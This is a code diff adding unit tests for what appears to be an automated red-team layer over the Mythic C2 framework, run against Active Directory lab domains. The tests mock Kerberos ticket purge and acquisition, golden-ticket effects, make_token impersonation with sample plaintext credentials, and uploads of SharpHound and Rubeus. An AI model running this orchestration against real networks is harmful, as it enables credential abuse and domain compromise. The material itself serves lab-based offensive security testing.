+        "consumes": [],
+    }
+    mt._deterministic_capability_command_contexts[
+        mythic_tools._capability_command_key("run", acquire_params)
+    ] = {
+        "capability": "ensure-kerberos-context",
+        "operation": "kerberos-service-ticket-acquire",
+        "expected_probe": "extract_ticket_cache_probe",
+        "produces": ["kerberos_service_ticket_acquired"],
+        "consumes": ["kerberos_current_tickets_purged"],
+    }
+    outputs = iter([
+        "Access is denied.",
+        "Ticket(s) purged!",
+        "A ticket to cifs/dc01.lab.local has been retrieved successfully.",
+        " Directory of \\\\dc01.lab.local\\C$\r\nWindows\r\n",
+    ])
+    calls = {"issue": 0}
+
+    with _split_issue(lambda: next(outputs), calls, display_id=7172):
+        preflight = asyncio.run(mt.issue_task_and_waitfor_task_output("run", proof_params, 13, timeout=5))
+        before_epoch = mt._kerberos_context_epoch(13)
+        before_key = mt._task_failure_key("shell", 13, proof_params)
+        purged = asyncio.run(mt.issue_task_and_waitfor_task_output("run", purge_params, 13, timeout=5))
+        acquired = asyncio.run(mt.issue_task_and_waitfor_task_output("run", acquire_params, 13, timeout=5))
+        after_epoch = mt._kerberos_context_epoch(13)
+        after_key = mt._task_failure_key("shell", 13, proof_params)
+        proof = asyncio.run(mt.issue_task_and_waitfor_task_output("run", proof_params, 13, timeout=5))
+
+    assert preflight.startswith("genuine failure")
+    assert "purged" in purged.casefold()
+    assert "retrieved successfully" in acquired.casefold()
+    assert before_epoch == 0
+    assert after_epoch > before_epoch
+    assert before_key != after_key
+    assert before_key[-2:] == ("kerberos_context_epoch", before_epoch)
+    assert after_key[-2:] == ("kerberos_context_epoch", after_epoch)
+    assert "Directory of" in proof
+    assert calls["issue"] == 4
+
+
+def test_ensure_context_service_proof_retry_key_does_not_advance_after_failed_native_refresh():
+    mt = _make_tools()
+
+    async def no_schema(command, callback_display_id):
+        return []
+
+    async def no_validation(command, parameters, callback_display_id):
+        return None
+
+    mt._fetch_command_schema = no_schema
+    mt._validate_command_parameters = no_validation
+    proof_params = _seed_ensure_context_service_proof(mt)
+    purge_params = {"executable": "klist.exe", "arguments": "purge"}
+    mt._deterministic_capability_command_contexts[
+        mythic_tools._capability_command_key("run", purge_params)
+    ] = {
+        "capability": "ensure-kerberos-context",
+        "operation": "kerberos-ticket-purge",
+        "expected_probe": "extract_ticket_cache_probe",
+        "produces": ["kerberos_current_tickets_purged"],
+        "consumes": [],
+    }
+    outputs = iter([
+        "Access is denied.",
+        "The system cannot find the file specified.",
+    ])
+    calls = {"issue": 0}
+
+    with _split_issue(lambda: next(outputs), calls, display_id=7173):
+        preflight = asyncio.run(mt.issue_task_and_waitfor_task_output("run", proof_params, 13, timeout=5))
+        before_epoch = mt._kerberos_context_epoch(13)
+        before_key = mt._task_failure_key("shell", 13, proof_params)
+        refresh = asyncio.run(mt.issue_task_and_waitfor_task_output("run", purge_params, 13, timeout=5))
+        after_epoch = mt._kerberos_context_epoch(13)
+        after_key = mt._task_failure_key("shell", 13, proof_params)
+        proof = asyncio.run(mt.issue_task_and_waitfor_task_output("run", proof_params, 13, timeout=5))
+
+    assert preflight.startswith("genuine failure")
+    assert refresh.startswith("genuine failure")
+    assert before_epoch == 0
+    assert after_epoch == before_epoch
+    assert before_key == after_key
+    assert proof.startswith("STOP")
+    assert calls["issue"] == 2
+
+
 def test_default_ensure_context_effects_include_cross_domain_admin_control():
     mt = _make_tools()
 
@@ -6295,7 +7765,7 @@ def test_forge_golden_ticket_service_proof_records_da_effect():
     assert "da:sevenkingdoms.local" in {
         effect for hop in mt._engagement_hops for effect in hop.satisfied_effects
     }
-    assert mt._engagement_hops[-1].evidence["mythic_task_id"] == 8181
+    assert mt._engagement_hops[-1].evidence["mythic_task_id"] == "8181"
 
 
 def test_gate_failure_fails_open_and_issues_normally():
@@ -6378,13 +7848,47 @@ def test_register_file_dedup_reuses_on_hash_match(monkeypatch):
         return {"agent_file_id": "existing-uuid", "filename_utf8": "SharpHound.exe"}
     monkeypatch.setattr(mt, "_find_uploaded_file_by_hash", fake_find)
     called = {"register": 0}
-    async def fake_register(client, filename, contents):
+    async def fake_register(filename, contents):
         called["register"] += 1
         return "new-uuid"
-    monkeypatch.setattr(mythic_tools.mythic, "register_file", fake_register)
+    monkeypatch.setattr(mt, "_register_file", fake_register)
     uuid, reused = asyncio.run(mt._register_file_dedup("SharpHound.exe", b"abc"))
     assert reused is True and uuid == "existing-uuid"
     assert called["register"] == 0  # the identical-hash file is reused, NOT re-uploaded
+
+
+def test_register_file_prefers_v4_root_webhook(monkeypatch):
+    mt = _make_tools()
+    calls = []
+
+    async def fake_post(path, filename, content):
+        calls.append((path, filename, content))
+        return 200, json.dumps({"status": "success", "agent_file_id": "v4-uuid"})
+
+    monkeypatch.setattr(mt, "_post_registered_file_webhook", fake_post)
+
+    uuid = asyncio.run(mt._register_file("SharpHound.exe", b"abc"))
+
+    assert uuid == "v4-uuid"
+    assert calls == [("/task_upload_file_webhook", "SharpHound.exe", b"abc")]
+
+
+def test_register_file_falls_back_to_legacy_webhook_only_when_v4_route_missing(monkeypatch):
+    mt = _make_tools()
+    calls = []
+
+    async def fake_post(path, filename, content):
+        calls.append(path)
+        if path == "/task_upload_file_webhook":
+            return 404, "404 page not found"
+        return 200, json.dumps({"status": "success", "agent_file_id": "legacy-uuid"})
+
+    monkeypatch.setattr(mt, "_post_registered_file_webhook", fake_post)
+
+    uuid = asyncio.run(mt._register_file("SharpHound.exe", b"abc"))
+
+    assert uuid == "legacy-uuid"
+    assert calls == ["/task_upload_file_webhook", "/api/v1.4/task_upload_file_webhook"]
 
 
 def test_register_file_dedup_uploads_on_hash_miss(monkeypatch):
@@ -6393,10 +7897,10 @@ def test_register_file_dedup_uploads_on_hash_miss(monkeypatch):
         return None
     monkeypatch.setattr(mt, "_find_uploaded_file_by_hash", fake_find)
     called = {"register": 0}
-    async def fake_register(client, filename, contents):
+    async def fake_register(filename, contents):
         called["register"] += 1
         return "new-uuid"
-    monkeypatch.setattr(mythic_tools.mythic, "register_file", fake_register)
+    monkeypatch.setattr(mt, "_register_file", fake_register)
     uuid, reused = asyncio.run(mt._register_file_dedup("Changed.exe", b"xyz"))
     assert reused is False and uuid == "new-uuid"
     assert called["register"] == 1  # a changed/new-hash binary uploads normally
@@ -6410,13 +7914,13 @@ def test_register_file_dedup_uploads_when_hash_match_has_different_filename(monk
 
     called = {"register": 0}
 
-    async def fake_register(client, filename, contents):
+    async def fake_register(filename, contents):
         called["register"] += 1
         assert filename == "Rubeus.exe"
         return "rubeus-uuid"
 
     monkeypatch.setattr(mt, "_find_uploaded_file_by_hash", fake_find)
-    monkeypatch.setattr(mythic_tools.mythic, "register_file", fake_register)
+    monkeypatch.setattr(mt, "_register_file", fake_register)
 
     uuid, reused = asyncio.run(mt._register_file_dedup("Rubeus.exe", b"same-bytes"))
 
@@ -6622,6 +8126,36 @@ def test_issue_path_registers_schema_selected_file_before_resolver(monkeypatch):
     assert calls["issued"][0]["parameters"] == {"tool": "SharpHound.exe"}
 
 
+def test_issue_path_blocks_when_registered_file_upload_fails(monkeypatch):
+    mt = _make_tools()
+
+    async def fake_schema(command, callback_display_id):
+        return _registered_file_schema([])
+
+    async def fake_ensure(name):
+        return json.dumps({
+            "status": "error",
+            "binary_filename": name,
+            "error": "Mythic file upload /task_upload_file_webhook returned HTTP 404",
+        })
+
+    monkeypatch.setattr(mt, "_fetch_command_schema", fake_schema)
+    monkeypatch.setattr(mt, "ensure_tool_uploaded", fake_ensure)
+
+    calls = {"issue": 0}
+    with _split_issue("should not run", calls):
+        result = asyncio.run(mt.issue_task_and_waitfor_task_output(
+            "custom-runner",
+            {"tool": "SharpHound.exe"},
+            2,
+        ))
+
+    assert result.startswith(mythic_tools._REGISTERED_FILE_PREFLIGHT_PREFIX)
+    assert "SharpHound.exe" in result
+    assert "Do not retry" in result
+    assert calls["issue"] == 0
+
+
 def test_registered_file_preflight_skips_when_schema_already_has_choice(monkeypatch):
     mt = _make_tools()
 
@@ -6808,6 +8342,57 @@ def test_wait_for_seconds_is_bounded(monkeypatch):
     assert "gp refresh" in out
 
 
+def test_capability_wait_emits_started_minute_progress_and_completed(monkeypatch):
+    mt = _make_tools()
+    waits = []
+    events = []
+
+    async def fake_sleep(seconds):
+        waits.append(seconds)
+
+    async def observer(event):
+        events.append(event)
+
+    async def binding(command_obj, _callback_id):
+        return {
+            "ok": True,
+            "command": command_obj["command"],
+            "parameters": command_obj["parameters"],
+        }
+
+    monkeypatch.setattr(mythic_tools.asyncio, "sleep", fake_sleep)
+    mt.set_capability_command_observer(observer)
+    mt._prepare_capability_command_binding = binding
+
+    item = asyncio.run(mt._execute_capability_command(
+        {
+            "command": "wait_for_seconds",
+            "parameters": {"seconds": 300, "reason": "wait for Group Policy refresh"},
+        },
+        2,
+        timeout=5,
+        capability_name="abuse-gpo",
+    ))
+
+    assert waits == [60, 60, 60, 60, 60]
+    assert [event["status"] for event in events] == [
+        "started",
+        "progress",
+        "progress",
+        "progress",
+        "progress",
+        "completed",
+    ]
+    assert [event.get("result_preview") for event in events[1:-1]] == [
+        "1 minute elapsed; 4 minutes remaining",
+        "2 minutes elapsed; 3 minutes remaining",
+        "3 minutes elapsed; 2 minutes remaining",
+        "4 minutes elapsed; 1 minute remaining",
+    ]
+    assert len({event["trace_id"] for event in events}) == 1
+    assert item["command"] == "wait_for_seconds"
+
+
 def test_rewrite_shell_like_run_handles_json_command():
     mt = _make_tools()
     command, params = mt._rewrite_shell_like_run(
@@ -6855,6 +8440,386 @@ def _merlin_shell_schema():
             "default_value": None,
         },
     ]
+
+
+def _apollo_make_token_schema():
+    return [
+        {
+            "name": "credential",
+            "cli_name": "Credential",
+            "type": "CredentialJson",
+            "parameter_group_name": "credential_store",
+            "required": True,
+            "choices": [],
+            "default_value": None,
+        },
+        {
+            "name": "netOnly",
+            "cli_name": "netOnly",
+            "type": "Boolean",
+            "parameter_group_name": "credential_store",
+            "required": False,
+            "choices": [],
+            "default_value": True,
+        },
+    ]
+
+
+def test_credential_binder_converts_only_live_credential_parameters():
+    mt = _make_tools()
+    mt._fetch_credentials_cached = lambda now: asyncio.sleep(0, result=[{
+        "id": 91,
+        "account": "Administrator",
+        "realm": "ws01",
+        "type": "plaintext",
+        "credential_text": "CorrectHorseBatteryStaple!",
+    }])
+    parameters = {
+        "credential": {
+            "id": "91",
+            "account": "Administrator",
+            "realm": "ws01",
+            "credential": "CorrectHorseBatteryStaple!",
+            "type": "plaintext",
+        },
+        "netOnly": True,
+    }
+
+    bound = asyncio.run(mt._bind_mythic_credential_parameters(
+        "make_token",
+        parameters,
+        13,
+        param_schema=_apollo_make_token_schema(),
+    ))
+
+    assert bound == {"credential": "@cred:91", "netOnly": True}
+    assert parameters["credential"]["id"] == "91"
+
+
+def test_credential_id_binding_requires_account_realm_consistency():
+    mt = _make_tools()
+    mt._fetch_credentials_cached = lambda now: asyncio.sleep(0, result=[
+        {
+            "id": 91,
+            "account": "Administrator",
+            "realm": "braavos",
+            "type": "plaintext",
+            "credential_text": "CorrectHorseBatteryStaple!",
+        },
+        {
+            "id": 92,
+            "account": "Administrator",
+            "realm": "essos.local",
+            "type": "plaintext",
+            "credential_text": "SageNetOnlyContext1!",
+        },
+    ])
+
+    reference = asyncio.run(mt._resolve_mythic_credential_reference({
+        "id": "91",
+        "account": "Administrator",
+        "realm": "essos.local",
+        "credential": "SageNetOnlyContext1!",
+        "type": "plaintext",
+    }))
+
+    assert reference == "@cred:92"
+
+
+def test_force_refresh_credential_binding_is_idempotent_during_store_delay(monkeypatch):
+    mt = _make_tools()
+    mt._fetch_credentials_cached = lambda now: asyncio.sleep(0, result=[])
+    created = []
+
+    async def fake_create_credential(client, credential, account, realm, comment, credential_type):
+        created.append((account, realm, credential, credential_type))
+        return {"id": 100 + len(created)}
+
+    monkeypatch.setattr(mythic_tools.mythic, "create_credential", fake_create_credential)
+    value = {
+        "account": "Administrator",
+        "realm": "essos.local",
+        "credential": "SageNetOnlyContext1!",
+        "type": "plaintext",
+    }
+
+    first = asyncio.run(mt._resolve_mythic_credential_reference(value))
+    second = asyncio.run(mt._resolve_mythic_credential_reference(value, force_refresh=True))
+
+    assert first == "@cred:101"
+    assert second == first
+    assert created == [("Administrator", "essos.local", "SageNetOnlyContext1!", "plaintext")]
+
+
+def test_credential_binder_leaves_merlin_direct_user_pass_unchanged():
+    mt = _make_tools()
+    parameters = {
+        "user": "Administrator",
+        "pass": "CorrectHorseBatteryStaple!",
+        "domain": "ws01",
+    }
+    schema = [
+        _string_param("user"),
+        _string_param("pass"),
+        _string_param("domain"),
+    ]
+
+    bound = asyncio.run(mt._bind_mythic_credential_parameters(
+        "make_token",
+        parameters,
+        2,
+        param_schema=schema,
+    ))
+
+    assert bound == parameters
+
+
+def test_credential_binder_resolves_matching_store_credential_without_id():
+    mt = _make_tools()
+
+    async def fake_fetch_credentials(now):
+        return [{
+            "id": 91,
+            "account": "Administrator",
+            "realm": "ws01",
+            "type": "plaintext",
+            "credential_text": "CorrectHorseBatteryStaple!",
+        }]
+
+    mt._fetch_credentials_cached = fake_fetch_credentials
+    parameters = {
+        "credential": {
+            "account": "Administrator",
+            "realm": "ws01",
+            "credential": "CorrectHorseBatteryStaple!",
+            "type": "plaintext",
+        },
+        "netOnly": True,
+    }
+
+    bound = asyncio.run(mt._bind_mythic_credential_parameters(
+        "make_token",
+        parameters,
+        13,
+        param_schema=_apollo_make_token_schema(),
+    ))
+
+    assert bound["credential"] == "@cred:91"
+
+
+def test_issue_path_repairs_mythic_credential_reference_rejection_once(monkeypatch):
+    mt = _make_tools()
+    calls = {"issue": 0}
+
+    async def make_token_schema(command, callback_display_id):
+        assert command == "make_token"
+        return _apollo_make_token_schema()
+
+    async def fake_issue_task(mythic, command_name, parameters, callback_display_id, wait_for_complete=True, timeout=None):
+        calls["issue"] += 1
+        calls.setdefault("parameters", []).append(parameters)
+        if calls["issue"] == 1:
+            raise Exception("Failed to process task references: cred parameters require @cred task references")
+        return {"display_id": 7300}
+
+    async def fake_waitfor(mythic, task_display_id, timeout=None):
+        return "Successfully impersonated ws01\\Administrator for remote access."
+
+    monkeypatch.setattr(mt, "_fetch_command_schema", make_token_schema)
+    mt._fetch_credentials_cached = lambda now: asyncio.sleep(0, result=[{
+        "id": 91,
+        "account": "Administrator",
+        "realm": "ws01",
+        "type": "plaintext",
+        "credential_text": "CorrectHorseBatteryStaple!",
+    }])
+    monkeypatch.setattr(mythic_tools.mythic, "issue_task", fake_issue_task)
+    monkeypatch.setattr(mythic_tools.mythic, "waitfor_for_task_output", fake_waitfor)
+    original_bind = mt._bind_mythic_credential_parameters
+    bind_calls = {"count": 0}
+
+    async def delayed_bind(*args, **kwargs):
+        bind_calls["count"] += 1
+        if bind_calls["count"] == 1:
+            return args[1]
+        return await original_bind(*args, **kwargs)
+
+    monkeypatch.setattr(mt, "_bind_mythic_credential_parameters", delayed_bind)
+    parameters = {
+        "credential": {
+            "id": "91",
+            "account": "Administrator",
+            "realm": "ws01",
+            "credential": "CorrectHorseBatteryStaple!",
+            "type": "plaintext",
+        },
+        "netOnly": True,
+    }
+
+    output = asyncio.run(mt.issue_task_and_waitfor_task_output(
+        "make_token",
+        parameters,
+        13,
+        timeout=5,
+    ))
+
+    assert "Successfully impersonated" in output
+    assert calls["issue"] == 2
+    assert isinstance(calls["parameters"][0]["Credential"], dict)
+    assert calls["parameters"][1]["Credential"] == "@cred:91"
+
+
+def test_bound_credential_contexts_keep_distinct_make_token_identities(monkeypatch):
+    mt = _make_tools()
+    calls = {"issue": 0}
+
+    async def make_token_schema(command, callback_display_id):
+        return _apollo_make_token_schema()
+
+    monkeypatch.setattr(mt, "_fetch_command_schema", make_token_schema)
+    mt._fetch_credentials_cached = lambda now: asyncio.sleep(0, result=[
+        {
+            "id": 88,
+            "account": "cersei.lannister",
+            "realm": "sevenkingdoms.local",
+            "type": "plaintext",
+            "credential_text": "SageNetOnlyContext1!",
+        },
+        {
+            "id": 91,
+            "account": "Administrator",
+            "realm": "braavos",
+            "type": "plaintext",
+            "credential_text": "CorrectHorseBatteryStaple!",
+        },
+        {
+            "id": 92,
+            "account": "Administrator",
+            "realm": "essos.local",
+            "type": "plaintext",
+            "credential_text": "SageNetOnlyContext1!",
+        },
+    ])
+    cersei = {
+        "credential": {
+            "id": "88",
+            "account": "cersei.lannister",
+            "realm": "sevenkingdoms.local",
+            "credential": "SageNetOnlyContext1!",
+            "type": "plaintext",
+        },
+        "netOnly": True,
+    }
+    braavos = {
+        "credential": {
+            "id": "91",
+            "account": "Administrator",
+            "realm": "braavos",
+            "credential": "CorrectHorseBatteryStaple!",
+            "type": "plaintext",
+        },
+        "netOnly": True,
+    }
+    essos = {
+        "credential": {
+            "id": "92",
+            "account": "Administrator",
+            "realm": "essos.local",
+            "credential": "SageNetOnlyContext1!",
+            "type": "plaintext",
+        },
+        "netOnly": True,
+    }
+
+    with _split_issue("Successfully impersonated remote identity.", calls):
+        first = asyncio.run(mt.issue_task_and_waitfor_task_output("make_token", cersei, 1, timeout=5))
+        second = asyncio.run(mt.issue_task_and_waitfor_task_output("make_token", braavos, 1, timeout=5))
+        third = asyncio.run(mt.issue_task_and_waitfor_task_output("make_token", essos, 1, timeout=5))
+        duplicate = asyncio.run(mt.issue_task_and_waitfor_task_output("make_token", essos, 1, timeout=5))
+
+    assert "Successfully impersonated" in first
+    assert "Successfully impersonated" in second
+    assert "Successfully impersonated" in third
+    assert calls["issue"] == 3
+    assert calls["issued"][0]["parameters"]["Credential"] == "@cred:88"
+    assert calls["issued"][1]["parameters"]["Credential"] == "@cred:91"
+    assert calls["issued"][2]["parameters"]["Credential"] == "@cred:92"
+    assert mt._kerberos_logon_context_keys == {(1, "essos.local", "administrator", True)}
+    assert "matching NetOnly Kerberos logon context" in duplicate
+    assert "administrator@essos.local" in duplicate.casefold()
+
+
+def test_bound_credential_reference_without_identity_does_not_create_empty_duplicate_key():
+    mt = _make_tools()
+
+    assert mt._kerberos_logon_context_key(
+        "make_token",
+        1,
+        {"Credential": "@cred:91", "netOnly": True},
+    ) is None
+
+
+def test_failure_breaker_survives_credential_rebinding():
+    mt = _make_tools()
+    original = {
+        "Credential": {
+            "account": "Administrator",
+            "realm": "essos.local",
+            "credential": "SageNetOnlyContext1!",
+            "type": "plaintext",
+        },
+        "netOnly": True,
+    }
+    first_bound = {"Credential": "@cred:91", "netOnly": True}
+    second_bound = {"Credential": "@cred:92", "netOnly": True}
+
+    mt._register_bound_command_parameters("make_token", original, first_bound)
+    mt._register_bound_command_parameters("make_token", original, second_bound)
+
+    first_key = mt._task_failure_key("make_token", 13, first_bound)
+    second_key = mt._task_failure_key("make_token", 13, second_bound)
+    mt._task_failure_counts[first_key] = 2
+
+    assert second_key == first_key
+    assert mt._task_failure_counts[second_key] == 2
+
+
+def test_issue_failure_breaker_stops_after_credential_reference_changes(monkeypatch):
+    mt = _make_tools()
+    mt._fetch_command_schema = lambda command, callback_display_id: asyncio.sleep(
+        0,
+        result=_apollo_make_token_schema(),
+    )
+    bind_calls = {"count": 0}
+
+    async def changing_bind(command, parameters, callback_display_id, **kwargs):
+        bind_calls["count"] += 1
+        bound = dict(parameters)
+        bound["Credential"] = f"@cred:{90 + bind_calls['count']}"
+        mt._register_bound_command_parameters(command, parameters, bound)
+        return bound
+
+    monkeypatch.setattr(mt, "_bind_mythic_credential_parameters", changing_bind)
+    parameters = {
+        "credential": {
+            "account": "Administrator",
+            "realm": "essos.local",
+            "credential": "SageNetOnlyContext1!",
+            "type": "plaintext",
+        },
+        "netOnly": True,
+    }
+    calls = {"issue": 0}
+
+    with _split_issue("temporary error", calls):
+        first = asyncio.run(mt.issue_task_and_waitfor_task_output("make_token", parameters, 13, timeout=5))
+        second = asyncio.run(mt.issue_task_and_waitfor_task_output("make_token", parameters, 13, timeout=5))
+        third = asyncio.run(mt.issue_task_and_waitfor_task_output("make_token", parameters, 13, timeout=5))
+
+    assert first == "temporary error"
+    assert second == "temporary error"
+    assert calls["issue"] == 2
+    assert "already failed 2 times" in third
 
 
 def test_issue_path_wraps_merlin_shell_command_line_from_live_schema(monkeypatch):
